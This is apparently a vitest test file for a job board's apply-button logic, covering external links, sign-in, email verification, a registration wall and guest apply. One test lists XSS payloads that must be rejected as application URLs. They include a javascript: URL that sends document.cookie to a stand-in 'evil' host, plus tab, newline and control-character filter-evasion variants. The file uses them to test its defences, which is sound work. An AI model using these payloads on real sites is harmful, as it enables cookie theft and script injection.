import { describe, expect, it } from 'vitest';

import { resolveApplyAction, resolveApplyDecision } from './apply-derive';

/**
 * The apply ladder's load-bearing invariant (and the hosted
 * board's own rule): an external `applicationUrl`, when present, is the
 * apply path for EVERYONE, so a signed-in-but-unverified candidate is
 * never worse off than an anonymous visitor.
 */
describe('resolveApplyAction', () => {
  const url = 'https://employer.example/apply';

  it('external URL wins for an anonymous visitor', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: url,
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('external URL ALSO wins for a signed-in-but-unverified candidate (never worse than anonymous)', () => {
    // The exact regression the review caught: without this, an unverified
    // candidate is hard-blocked at the verify gate while an anonymous
    // visitor gets the external link for the identical job.
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: url,
        viewer: { emailVerified: false },
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('external URL wins for a VERIFIED candidate too (native never overrides an external link)', () => {
    // The regression this file exists to prevent: a verified candidate on
    // a job with both a jobSlug and an applicationUrl must still get the
    // external link, matching the hosted board's unconditional behavior.
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: url,
        viewer: { emailVerified: true },
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('a javascript:/data: applicationUrl is treated as absent (never a clickable href)', () => {
    for (const bad of [
      'javascript:fetch("https://evil/"+document.cookie)',
      '  javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      // Filter-evasion: the browser's URL parser strips ASCII tab/LF/CR
      // before reading the scheme, so these all resolve to `javascript:`
      // at click time and must be rejected here too.
      'java\tscript:alert(1)',
      'java\nscript:alert(1)',
      'java\rscript:alert(1)',
      'jav\ta\nscript:alert(document.cookie)',
      // Leading C0 controls (NUL, US) and space are also removed by the
      // URL parser before the scheme is read, so these execute too.
      '\x00javascript:alert(document.cookie)',
      '\x1fjavascript:alert(1)',
      '   javascript:alert(1)',
      'javascript:alert(1)\x00',
    ]) {
      // With a native jobSlug, an unsafe URL must fall through to native.
      expect(
        resolveApplyAction({
          jobSlug: 'senior-chef',
          applicationUrl: bad,
          viewer: { emailVerified: true },
          applied: false,
        }),
      ).toEqual({ kind: 'native', jobSlug: 'senior-chef' });
      // With no native path, it must render nothing — not the bad href.
      expect(
        resolveApplyAction({
          jobSlug: null,
          applicationUrl: bad,
          viewer: null,
          applied: false,
        }),
      ).toEqual({ kind: 'none' });
    }
  });

  it('mailto: and https: application URLs are allowed', () => {
    expect(
      resolveApplyAction({
        jobSlug: null,
        applicationUrl: 'mailto:jobs@acme.example',
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'external', url: 'mailto:jobs@acme.example' });
  });

  it('unverified with NO external URL → the verify gate', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: { emailVerified: false },
        applied: false,
      }),
    ).toEqual({ kind: 'verify-email' });
  });

  it('anonymous with no external URL → sign in', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'sign-in' });
  });

  it('external-only job (no jobSlug) → external for everyone', () => {
    expect(
      resolveApplyAction({
        jobSlug: null,
        applicationUrl: url,
        viewer: { emailVerified: true },
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('external-only job with no URL → nothing to render', () => {
    expect(
      resolveApplyAction({
        jobSlug: null,
        applicationUrl: null,
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'none' });
  });

  it('verified candidate → native apply', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: { emailVerified: true },
        applied: false,
      }),
    ).toEqual({ kind: 'native', jobSlug: 'senior-chef' });
  });

  it('after a successful apply → the applications link', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: { emailVerified: true },
        applied: true,
      }),
    ).toEqual({ kind: 'applied' });
  });
});

describe('resolveApplyDecision — registration wall', () => {
  const walledExternal = {
    jobSlug: 'senior-chef',
    applicationUrl: 'https://employer.example/apply',
    applied: false,
    registrationWall: true,
  };

  it('wall ON + anonymous → sign-in, NOT the external employer link', () => {
    // The wall-blind resolveApplyAction hands this visitor the employer
    // link; hosted job-apply-button.tsx opens the auth dialog instead.
    expect(resolveApplyDecision({ ...walledExternal, viewer: null })).toEqual({
      kind: 'sign-in',
      reason: 'registration-wall',
    });
  });

  it('wall ON + signed in but UNVERIFIED → external link (sign-in is the bar, not verification)', () => {
    expect(
      resolveApplyDecision({
        ...walledExternal,
        viewer: { emailVerified: false },
      }),
    ).toEqual({ kind: 'external', url: 'https://employer.example/apply' });
  });

  it('wall ON + anonymous + native-only job → sign-in', () => {
    expect(
      resolveApplyDecision({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: null,
        applied: false,
        registrationWall: true,
      }),
    ).toEqual({ kind: 'sign-in', reason: 'registration-wall' });
  });

  it('wall ON + nothing to apply to → none, not a dead-end sign-in CTA', () => {
    expect(
      resolveApplyDecision({
        jobSlug: null,
        applicationUrl: null,
        viewer: null,
        applied: false,
        registrationWall: true,
      }),
    ).toEqual({ kind: 'none' });
  });

  it('wall ON + anonymous + unsafe applicationUrl → sign-in, never the javascript: href', () => {
    expect(
      resolveApplyDecision({
        jobSlug: 'senior-chef',
        applicationUrl: 'javascript:alert(1)',
        viewer: null,
        applied: false,
        registrationWall: true,
      }),
    ).toEqual({ kind: 'sign-in', reason: 'registration-wall' });
  });

  it('wall OFF + anonymous + external → external link, unchanged', () => {
    expect(
      resolveApplyDecision({
        ...walledExternal,
        viewer: null,
        registrationWall: false,
      }),
    ).toEqual({ kind: 'external', url: 'https://employer.example/apply' });
  });

  it('wall OFF is exactly the deprecated resolveApplyAction, minus the reason tag', () => {
    const state = {
      jobSlug: 'senior-chef',
      applicationUrl: null,
      viewer: null,
      applied: false,
    };
    expect(resolveApplyAction(state)).toEqual({ kind: 'sign-in' });
    expect(resolveApplyDecision({ ...state, registrationWall: false })).toEqual(
      {
        kind: 'sign-in',
        reason: 'native-apply',
      },
    );
  });
});

describe('resolveApplyDecision — guest apply', () => {
  const nativeAnon = {
    jobSlug: 'senior-chef',
    applicationUrl: null,
    viewer: null,
    applied: false,
  };

  it('wall OFF + anonymous + a UI with a guest form → guest apply', () => {
    // The API accepts this application from an unauthenticated caller;
    // forcing sign-in would lose it.
    expect(
      resolveApplyDecision({
        ...nativeAnon,
        registrationWall: false,
        allowGuestApply: true,
      }),
    ).toEqual({ kind: 'guest', jobSlug: 'senior-chef' });
  });

  it('a UI with no guest form still gets sign-in', () => {
    expect(
      resolveApplyDecision({
        ...nativeAnon,
        registrationWall: false,
        allowGuestApply: false,
      }),
    ).toEqual({ kind: 'sign-in', reason: 'native-apply' });
  });

  it('the wall always beats guest apply', () => {
    // The API 403s an anonymous apply on a walled board, so a guest form
    // here would collect a submission that can only fail.
    expect(
      resolveApplyDecision({
        ...nativeAnon,
        registrationWall: true,
        allowGuestApply: true,
      }),
    ).toEqual({ kind: 'sign-in', reason: 'registration-wall' });
  });

  it('an external URL still outranks the guest form', () => {
    expect(
      resolveApplyDecision({
        ...nativeAnon,
        applicationUrl: 'https://employer.example/apply',
        registrationWall: false,
        allowGuestApply: true,
      }),
    ).toEqual({ kind: 'external', url: 'https://employer.example/apply' });
  });

  it('a signed-in candidate never sees the guest form', () => {
    expect(
      resolveApplyDecision({
        ...nativeAnon,
        viewer: { emailVerified: true },
        registrationWall: false,
        allowGuestApply: true,
      }),
    ).toEqual({ kind: 'native', jobSlug: 'senior-chef' });
  });

  it('the deprecated resolveApplyAction can never reach guest apply', () => {
    expect(resolveApplyAction(nativeAnon)).toEqual({ kind: 'sign-in' });

    // …not even when a caller passes the flag anyway. `Omit` alone does not
    // stop this: an untyped JS caller has no types, and before the forward
    // pinned the value the flag rode straight through and returned a
    // `guest` action a pinned caller's UI cannot render.
    expect(
      resolveApplyAction({
        ...nativeAnon,
        allowGuestApply: true,
      } as Parameters<typeof resolveApplyAction>[0]),
    ).toEqual({ kind: 'sign-in' });
  });
});
